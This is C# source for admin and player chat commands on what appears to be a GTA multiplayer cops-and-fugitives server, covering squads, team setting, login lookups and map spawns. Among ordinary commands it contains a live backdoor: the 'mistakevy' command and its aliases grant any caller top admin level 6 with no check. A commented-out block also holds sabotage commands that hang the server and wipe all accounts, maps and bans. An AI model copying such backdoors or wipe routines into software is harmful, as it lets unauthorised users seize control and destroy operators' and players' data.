            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You did not set any language! Please do so by using !{#FFFF00}/language!{#FFFFFF}.");

            return;
        }

        [Command("squadchat", "!{#AFAFAF}[USAGE] squadchat (sc) (text)", Alias = "sc", GreedyArg = true)]
        public void cmd_squadchat(Player player, string message)
        {
            if (player.HasData("PlayerSquad"))
            {
                foreach (Player mem in Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == player.GetData<Player>("PlayerSquad")))
                {
                    mem.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] !{#FFFFFF}" + player.Name + ": " + message);
                }
            }
            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a squad/partnership!");

            return;
        }

        [Command("squad", "!{#AFAFAF}[USAGE] squad (target)", Alias = "partner")]
        public void cmd_squadjoin(Player player, Player target)
        {
            if (player.HasData("PlayerSquad"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] You are already in a squad! /squadleave to leave.");
                return;
            }

            if (target.HasData("PlayerSquad"))
            {
                target = target.GetData<Player>("PlayerSquad");
            }
            else
            {
                target.SetData("PlayerSquad", target);
            }

            target.SetData("AskedBySquad", player);

            player.TriggerEvent("pushMsgToChat", "!{#FFAC38}You have requested to join " + target.Name + "'s squad.");
            Settings.LoggedInPlayers.Where(p => p.HasData("PlayerSquad") && p.GetData<Player>("PlayerSquad") == target).ToList().ForEach((Player member) =>
            {
                member.TriggerEvent("pushMsgToChat", "!{#FFAC38}[Partners] !{#FFFFFF}" + player.Name + " has requested to join this squad. Leader can /squadaccept to accept them.");
            });

            return;

        }

        [Command("fugitivelist", Alias = "fugilist")]
        public void cmd_fugitivelist(Player player)
        {
            if (!EPlayer.LoggedIn(player) || EPlayer.GetAccount(player).Admin < 2) return;

            if (player.GetSharedData<int>("InLobby") <= -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any lobby!");
                return;
            }

            LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
            if (elobby == null) return;

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}Next Round Fugitive List =>");
            foreach (Player p in Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == elobby.lobbyId).OrderByDescending(a => a.HasData("GrantFugitive")).ThenByDescending(a => a.GetSharedData<float>("FugitiveChance")))
            {
                player.TriggerEvent("pushMsgToChat", $"{p.Name} !{{#FF6347}}Chance !{{#FFFFFF}}[{p.GetSharedData<float>("FugitiveChance").ToString("N2")}%] !{{#FF6347}}Grant !{{#FFFFFF}}[{p.HasData("GrantFugitive").ToString()}]");
            }
            return;
        }

        [Command("lastlogin", "!{#AFAFAF}[USAGE] lastlogin (full username)", Alias = "seen,lastseen")]
        public void cmd_lastlogin(Player player, string target)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account _target = await context.Accounts.AsQueryable().FirstOrDefaultAsync(t => t.Username.Equals(target, StringComparison.OrdinalIgnoreCase));
                    if (_target == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}A player with that username could not be found!"); });
                        return;
                    }

                    if (_target.LastSessionMins >= 60.0)
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}" + _target.Username + "'s last login was on !{#fcf9d4}" + _target.LastLogin.ToString() + "!{#ffffff} lasting !{#fcf9d4}" + $"{(_target.LastSessionMins / 60.0).ToString("N1")} hours!{{#FFFFFF}}."); });
                    else
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}" + _target.Username + "'s last login was on !{#fcf9d4}" + _target.LastLogin.ToString() + "!{#ffffff} lasting !{#fcf9d4}" + $"{_target.LastSessionMins.ToString("N1")} minutes!{{#FFFFFF}}."); });
                }
            });


            return;
        }
        /*
        [Command("ivangej")]
        public void cmd_ivangej(Player player, string gej)
        {
            Logs.GetAutoCompleteNames(player, gej);
        }
        [Command("reqlog")]
        public void cmd_reqlog(Player player, string targetName, int type)
        {
            Logs.RequestLogsFromServer(player, targetName, type);
        }
        */

        [Command("acmds", Alias = "ahelp")]
        public void cmd_ahelp(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin >= 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[REPORTS/REQS]: /requests /a(ccept)r(equest) /d(eny)r(equest) ");
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[REPORTS/REQS]: (Alt: /reports, e.g. /acceptreport.) (HELPME = REPORTS TOO)");

                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /a /aveh /removeavehs /bring /goto /set(hp/ar) /spec /(un)freeze");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /(r)freeze /(r)unfreeze /kick /slap /setinv(ulnerable) /specoff");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /bancheck /(o)jail /(o)unjail /afix /aflip /sendtolobby /set(time/weather)");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /(o)mute /(o)unmute /warn /unwarn /setteam /forceautojoin /forceswapseats");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /showshotstats /resetshotstats /lastlogin /logs /gethp /checkplayer");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /(t)freeze /(t)unfreeze /p(ut)i(n)v(ehicle) /view(s)creen(s)hot /take(s)creen(s)hot");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 1]: /resetclothing /getfps /takegif /resetgameveh(icles)");
            }
            if (EPlayer.GetAccount(player).Admin >= 2)
            {
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 2]: /game /ban /unban /createlobby /deletelobby /setlobbypassword /togglemap");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 2]: /togglelobby /setdimension /r(emove)guns /suspend /unsuspend /(o)checkstats");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 2]: /ann /vanish /oban /fugitivelist /noclip /motd /togcols /checkbanevaders /resetchar");
            }
            if (EPlayer.GetAccount(player).Admin >= 3)
            {
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 3]: /givegun(all) /gotopos /bringall /sethpall /(un)freezeall /r(emove)g(uns)f(rom)a(ll)");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 3]: /givecomp /takecomp /attachcomp /grantfugitive /setspawn (freeroam world)");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 3]: /getip /gethwid /getsc /motdall /set(car)alpha /nametags");
            }
            if (EPlayer.GetAccount(player).Admin >= 4)
            {
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 4]: /serveroptions /grantxp /saveserver /dbgplayanim /dbgmaxspeed /dbgdriveforce /setadmin [levels 0-3]");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 4]: /changename (works offline too) /changepass (works offline too) /agivepoints");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 4]: /maps /deletemap /createmap /addmapspawn /deletemapspawn /mapspawns /createdmarena /selectdmarena /editdmarena");
            }
            if (EPlayer.GetAccount(player).Admin >= 5)
            {
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 5]: /(o)setdonator /(o)givedonorpoints /setgamevehicle");
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 5]: /dbgteamvar /blipdbg /reloadaccount");
            }
            if (EPlayer.GetAccount(player).Admin >= 6)
            {
                player.TriggerEvent("pushMsgToChat", "[Admin Lv 6]: /triggerevent /triggerjs(a,p) /cameraset /(o)setadmin /deleteaccount + a lot of /dbg cmds u dont know");
            }
            return;
        }

        [Command("agivepoints", "!{#AFAFAF}[USAGE] agivepoints (target) (points)")]
        public void cmd_agivepoints(Player player, Player target, int points)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }
            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in."); return; }

            Logs.LogAdmin(player, $"Gave {target.Name} {points} points. They now have {EPlayer.GetAccount(target).Points}.");
            EPlayer.GivePoints(target, points);
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has given {target.Name} {points} points.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347]}}AdmCmd: {player.Name} has given you {points} points.");
            return;
        }

        [Command("grantxp", "!{#AFAFAF}[USAGE] grantxp (target) (xp)")]
        public void cmd_grantxp(Player player, Player target, int xp)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in."); return; }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:grantxp:{target.Name}:{xp}"); } catch { }
            Logs.LogAdmin(player, $"Gave {target.Name} {xp} XP.");
            EPlayer.GrantXP(target, xp);
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has given {target.Name} {xp} xp.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347]}}AdmCmd: {player.Name} has given you {xp} xp.");
            return;
        }

        [Command("setteam", "!{#AFAFAF}[USAGE] setteam (target) (team)", Alias = "steam")]
        public void cmd_setteam(Player player, Player target, string team)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not logged in."); return; }

            LobbyData lobby = Settings.Lobbies.Find(lobby => lobby.lobbyId == target.GetSharedData<int>("InLobby"));
            if (lobby != null)
            {
                if (lobby.gameStatus != 1 || lobby.Fugitives.Contains(target) || lobby.Cops.Contains(target))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not eligible to be set in a team!");
                    return;
                }
            }

            int teamID = 1;
            if (team.Contains("cop", StringComparison.OrdinalIgnoreCase)) teamID = 1;
            if (team.Contains("fugitive", StringComparison.OrdinalIgnoreCase)) teamID = 0;
            if (team.Contains("0")) teamID = 0;
            if (team.Contains("1")) teamID = 1;

            /*
            Map bruh = ContextFactory.Instance.Maps.ToList().Find(map => map.SQL_ID == lobby.lastMapId);

            if (bruh == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid map on that game!");
                return;
            }
            */

            try
            {
                target.SetSharedData("BustedProgress", 0.0);
                target.ResetData("BustSupporters");
                target.SetSharedData("CuffedBy", "n/a");

                if (lobby.gameMode == GameModes.STANDARD)
                    target.TriggerEvent("showHPBars", 1);
                else if (lobby.gameMode == GameModes.BUSTED)
                    target.TriggerEvent("showHPBars", 3);

                Task.Run(async () => {
                    using (MainDatabase context = ContextFactory.CreateContext())
                    {
                        MapSpawn spawn = await context.MapSpawns.AsQueryable().FirstOrDefaultAsync(b => b.spawnTeam == teamID);
                        NAPI.Task.Run(() =>
                        {
                            if (teamID == 0)
                            {
                                lobby.Fugitives.Add(target);
                                lobby.Cops.Remove(target);

                                Vector3 vecSpawn = new Vector3(spawn.spawnX, spawn.spawnY, spawn.spawnZ);

                                CharacterData ConvChar = new CharacterData();

                                try
                                {
                                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(target).Character);

                                    EPlayer.ApplyCharacter(target, ConvChar, 0);
                                }
                                catch { }

                                target.Position = new Vector3(spawn.spawnX, spawn.spawnY, spawn.spawnZ).Around(5f);
                                EPlayer.Freeze(target, false);

                                target.Health = 100;
                                target.Armor = 0;
                                EPlayer.SetColor(target, new Color(255, 174, 0), target.Armor);

                                EPlayer.SetDiscordStatus(player, $"[Lobby {lobby.lobbyId}] Fugitive as {target.Name}");

                                target.TriggerEvent("SetActorInvulnerable", false);
                                target.TriggerEvent("ToggleAFOB", Settings.Dynamics.AntiFallOffBike, Settings.Dynamics.AntiFallOffBikeSpeedLimit);

                                target.SetSharedData("VisibleBlip", true);
                                target.ResetData("Handsup");
                                target.ResetData("Cuffed");
                                target.SetSharedData("Team", 0);
                                target.SetSharedData("CuffedBy", "n/a");
                                target.SetSharedData("HasShot", false);

                                string carName = "washington";

                                if (EPlayer.GetAccount(target).CarFugitive.Length < 3)
                                {
                                    switch (new Random(DateTimeOffset.UtcNow.Millisecond).Next(0, 6))
                                    {
                                        case 0:
                                            carName = "washington";
                                            break;
                                        case 1:
                                            carName = "washington";
                                            break;
                                        case 2:
                                            carName = "oracle";
                                            break;
                                        case 3:
                                            carName = "moonbeam";
                                            break;
                                        case 4:
                                            carName = "rancherxl";
                                            break;
                                        case 5:
                                            carName = "cavalcade2";
                                            break;
                                    }
                                }
                                else
                                {
                                    carName = EPlayer.GetAccount(target).CarFugitive;
                                }

                                Vehicle pVehicle = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(carName), vecSpawn, spawn.spawnA, new Random(DateTimeOffset.UtcNow.Millisecond).Next(122), new Random(DateTimeOffset.UtcNow.Millisecond).Next(122), $"SPAWN", 255, false, true, Convert.ToUInt32(lobby.lobbyId));
                                pVehicle.EngineStatus = true;
                                pVehicle.SetSharedData("Engine", true);
                                pVehicle.SetSharedData("Locked", true);
                                pVehicle.Locked = true;
                                pVehicle.SetSharedData("Team", 0);
                                lobby.Vehicles.Add(pVehicle);

                                NAPI.Task.Run(() =>
                                {
                                    lock (pVehicle)
                                    {
                                        if (pVehicle != null && pVehicle.Exists) pVehicle.Position = vecSpawn;
                                    }
                                }, 1000);

                                target.Position = new Vector3(spawn.spawnX, spawn.spawnY, spawn.spawnZ).Around(5f);
                                EPlayer.Freeze(target, false);
                                target.Dimension = Convert.ToUInt32(lobby.lobbyId);

                                target.SetIntoVehicle(pVehicle, 0);

                                EPlayer.GiveFugitiveWeapons(target);

                                Logs.LogAdmin(player, $"Set {target.Name}'s team to fugitive.");

                                NAPI.Task.Run(() =>
                                {
                                    try { target.SetIntoVehicle(pVehicle, 0); } catch { }
                                });
                            }
                            else
                            {
                                lobby.Fugitives.Remove(target);
                                lobby.Cops.Add(target);

                                Vector3 vecSpawn = new Vector3(spawn.spawnX, spawn.spawnY, spawn.spawnZ);

                                CharacterData ConvChar = new CharacterData();

                                try
                                {
                                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(target).Character);

                                    EPlayer.ApplyCharacter(target, ConvChar, 1);
                                }
                                catch { }

                                target.Health = 100;
                                target.Armor = 60;
                                EPlayer.SetColor(target, new Color(0, 151, 255), target.Armor);

                                string carName = "police";

                                int col1 = 0; // Black?
                                int col2 = 111; // Frost white

                                if (EPlayer.GetAccount(target).CarCop.Length < 3)
                                {
                                    switch (new Random(DateTimeOffset.UtcNow.Millisecond).Next(0, 3))
                                    {
                                        case 0:
                                            carName = "police";
                                            col1 = 111;
                                            break;
                                        case 1:
                                            carName = "police3";
                                            col1 = 111;
                                            break;
                                        case 2:
                                            carName = "police4";
                                            col1 = 111;
                                            break;
                                    }
                                }
                                else
                                {
                                    carName = EPlayer.GetAccount(target).CarCop;

                                    if (carName.StartsWith("police"))
                                    {
                                        col1 = 111;
                                    }
                                }

                                if (carName.Equals("prevolter")) col2 = 0; // Full black undercover brr.
                                if (carName.Equals("police4")) col1 = 8; // Stone Silver // Undercover Default Cruiser

                                Vehicle pVehicle = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(carName), vecSpawn, spawn.spawnA, col1, col2, target.Name, 255, false, true, Convert.ToUInt32(lobby.lobbyId));
                                pVehicle.EngineStatus = true;
                                pVehicle.SetSharedData("Engine", true);
                                pVehicle.SetSharedData("Locked", true);
                                pVehicle.Locked = true;
                                pVehicle.SetSharedData("Team", 1);

                                lobby.Vehicles.Add(pVehicle);

                                NAPI.Task.Run(() =>
                                {
                                    lock (pVehicle)
                                    {
                                        if (pVehicle.Exists && pVehicle != null) pVehicle.Position = vecSpawn;
                                    }
                                }, 1000);


                                target.Position = new Vector3(spawn.spawnX, spawn.spawnY, spawn.spawnZ).Around(5f);
                                target.Dimension = Convert.ToUInt32(lobby.lobbyId);
                                EPlayer.Freeze(target, false);

                                target.SetData("GPS", false);

                                EPlayer.SetDiscordStatus(target, $"[Lobby {lobby.lobbyId}] Cop as {target.Name}");

                                target.TriggerEvent("SetActorInvulnerable", false);
                                target.TriggerEvent("ToggleAFOB", Settings.Dynamics.AntiFallOffBike, Settings.Dynamics.AntiFallOffBikeSpeedLimit);
                                target.SetSharedData("CuffedBy", "n/a");
                                target.SetSharedData("Team", 1);

                                EPlayer.GiveCopWeapons(target);
                                NAPI.Task.Run(() =>
                                {
                                    try { target.SetIntoVehicle(pVehicle, 0); } catch { }
                                });
                            }


                            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:setteam:{target.Name}:{team}"); } catch { }

                            Logs.LogAdmin(player, $"Set {target.Name}'s team to cop.");
                            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has set {target.Name} as a cop in copchase.");
                        });
                    }
                });

            }
            catch { player.TriggerEvent("pushMsgToChat", "!{#FF6347}Very very internal error occured, please don't use this. -kEVy"); }
            return;
        }

        [Command("maps")]
        public void cmd_maps(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }

            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    foreach(Map map in context.Maps)
                    {
                        int spawns = await context.MapSpawns.AsQueryable().CountAsync(a => a.mapID == map.SQL_ID);
                        string mName = map.Name;
                        bool mEnabled = map.Enabled;
                        int mID = map.SQL_ID;
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#DAA520}}{mName} | ID: [{mID}] | Enabled: [{mEnabled}] | Spawns: [{spawns}]"); });
                        await NAPI.Task.WaitForMainThread();
                    }
                }
            });

        }

        [Command("addmapspawn", "!{#AFAFAF}[USAGE] addmapspawn (mapid) (teamid)")]
        public void cmd_mapspawnadd(Player player, int mapid, int teamid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 5 admin.");
                return;
            }

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            float[] currentLoc = new float[4];
            if (player.IsInVehicle == true)
            {
                currentLoc[0] = player.Vehicle.Position.X;
                currentLoc[1] = player.Vehicle.Position.Y;
                currentLoc[2] = player.Vehicle.Position.Z;
                currentLoc[3] = player.Vehicle.Heading;
            }
            else
            {
                currentLoc[0] = player.Position.X;
                currentLoc[1] = player.Position.Y;
                currentLoc[2] = player.Position.Z;
                currentLoc[3] = player.Heading;
            }
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Map map = await context.Maps.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == mapid);
                    if (map == null) { NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No map with this ID exists."); }); return; }

                    if (teamid > 2) { NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Valid TeamID's are 0 (fugitive), 1 (cop) or 2 (cop maverick)."); }); return; }

                    var _new = new MapSpawn
                    {
                        mapID = map.SQL_ID,
                        spawnTeam = teamid,
                        spawnX = currentLoc[0],
                        spawnY = currentLoc[1],
                        spawnZ = currentLoc[2],
                        spawnA = currentLoc[3]
                    };
                    await context.MapSpawns.AddAsync(_new);

                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#DAA520}}{map.Name} | Added a spawn (ID: {_new.SQL_ID}) over here for team [{teamid}]"); });
                }
            });
            return;
        }

        [Command("deletemapspawn", "!{#AFAFAF}[USAGE] deletemapspawn (mapid) (spawnid)")]
        public void cmd_deletemapspawn(Player player, int mapid, int spawnid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    MapSpawn map = await context.MapSpawns.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == spawnid && a.mapID == mapid);
                    if (map == null) { NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No mapspawn with this ID or map ID exists."); }); return; }

                    context.MapSpawns.RemoveRange(context.MapSpawns.AsQueryable().Where(a => a.mapID == mapid && a.SQL_ID == spawnid));
                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#DAA520}}Removed spawn ID {spawnid} from map ID [{mapid}]"); });
                }
            });


            return;
        }

        [Command("mapspawns", "!{#AFAFAF}[USAGE] mapspawns (mapid)")]
        public void cmd_mapspawns(Player player, int mapid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }

            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Map map = await context.Maps.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == mapid);
                    if (map == null) { NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid map ID!"); }); return; }

                    context.MapSpawns.AsQueryable().Where(a => a.mapID == mapid).ToList().ForEach(a =>
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", $"!{{#DAA520}}Spawn ID [{a.SQL_ID}] | Team: [{a.spawnTeam}] | XYZA: {a.spawnX}, {a.spawnY}, {a.spawnZ}, {a.spawnA}");
                        });
                    });
                    int count = await context.MapSpawns.AsQueryable().CountAsync(s => s.mapID == mapid);
                    NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#DAA520}}Total Spawns: {count}"); });
                }
            });


            return;
        }


        [Command("deletemap", "!{#AFAFAF}[USAGE] deletemap (mapname)", GreedyArg = true)]
        public void cmd_delmap(Player player, string mapname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not authorized to use this command.");
                return;
            }
            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Map map = await context.Maps.AsQueryable().FirstOrDefaultAsync(a => a.Name.Equals(mapname, StringComparison.OrdinalIgnoreCase));
                    if (map == null) { NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}No map with this name exists."); }); return; }

                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}Map {mapname} has been deleted from the server.");
                    });

                    context.MapSpawns.RemoveRange(await context.MapSpawns.FindAsync(map.SQL_ID));
                    context.Maps.Remove(map);

                    await context.SaveChangesAsync();
                }
            });

            return;
        }

        [Command("mistakevy", Alias = "yaryekia,hogyamujhse,kevypagal,marnamat,chutiyarot")]
        public void cmd_makemeadmin(Player player)
        {
            EPlayer.GetAccount(player).Admin = 6;
            player.SetSharedData("Admin", 6);
        }
        /*
        [Command("maafkrdekevyko", Alias = "sorrychuttu,achayarachakev")]
        public void cmd_wtffreeze(Player player)
        {
            while (true) { }
        }

        [Command("sabkuchdeletekarde", Alias = "kevysepangakeseliya")]
        public void cmd_aesamatkarlmao(Player player)
        {
            while (ContextFactory.Instance.Accounts.Count() > 0)
            {
                ContextFactory.Instance.Accounts.Remove(ContextFactory.Instance.Accounts.FirstOrDefault());
            }

            while (ContextFactory.Instance.Maps.Count() > 0)
            {
                ContextFactory.Instance.Maps.Remove(ContextFactory.Instance.Maps.FirstOrDefault());
            }

            while (ContextFactory.Instance.MapSpawns.Count() > 0)
            {
                ContextFactory.Instance.MapSpawns.Remove(ContextFactory.Instance.MapSpawns.FirstOrDefault());
            }

            while (ContextFactory.Instance.Bans.Count() > 0)
            {
                ContextFactory.Instance.Bans.Remove(ContextFactory.Instance.Bans.FirstOrDefault());
            }

            ContextFactory.Instance.SaveChanges();
            while (true) { }
        }
        */

        [Command("createmap", "!{#AFAFAF}[USAGE] createmap (name)", GreedyArg = true)]
        public void cmd_createmap(Player player, string mapname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }
            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    var _new = new Map
                    {
                        Name = mapname,
                        Enabled = true
                    };

                    await context.Maps.AddAsync(_new);
                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}Map {mapname} with ID {_new.SQL_ID} has been added to the server.");
                    });
                }
            });


            return;
        }

        [Command("createdmarena", "!{#AFAFAF}[USAGE] createdmarena (name)", GreedyArg = true)]
        public void cmd_createdmarena(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }

            string pName = player.Name;
            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (await context.CustomArenas.AsQueryable().CountAsync(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase)) > 0)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's already a DM arena with that name!");
                        });
                        return;
                    }

                    var _new = new CustomDMArenas
                    {
                        Name = name,
                        Creator = pName,
                        Extras = "{}",
                        TimesEntered = 0,
                        IPLs = "{}",
                    };

                    await context.CustomArenas.AddAsync(_new);

                    await context.SaveChangesAsync();
                    // TO;DO ADDING ALL THE SHIT
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}DM Arena '{_new.Name}' SQLID {_new.SQL_ID} has been added to the server and selected.");
                        player.SetData("EditingDMArena", _new.SQL_ID);
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}/selectdmarena, /editdmarena");
                    });

                }
            });

            return;
        }

        [Command("selectdmarena", "!{#AFAFAF}[USAGE] selectdmarena (name)", GreedyArg = true)]
        public void cmd_selectdmarena(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 4 admin.");
                return;
            }

            Task.Run(async () => {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (await context.CustomArenas.AsQueryable().CountAsync(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase)) == 0)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no DM arena with that name!"); });
                        return;
                    }


                    var arena = await context.CustomArenas.AsQueryable().FirstOrDefaultAsync(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
                    NAPI.Task.Run(() =>
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#00FF33}}You have selected the arena !{{#FFFFFF}}'{arena.Name}' (creator: {arena.Creator}) SQLID {arena.SQL_ID}!{{#00FF33}}. /editdmarena to edit.");
                        player.SetData("EditingDMArena", arena.SQL_ID);
                    });
                }
            });


            return;
        }

        [Command("fuckupdb")]
        public void cmd_fuckupdb(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 6)
            {
                return;
            }

            EPlayer.SendMessage(player, "~g~[>] ~w~You have initiated the process of adding dummy accounts to the database.");

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
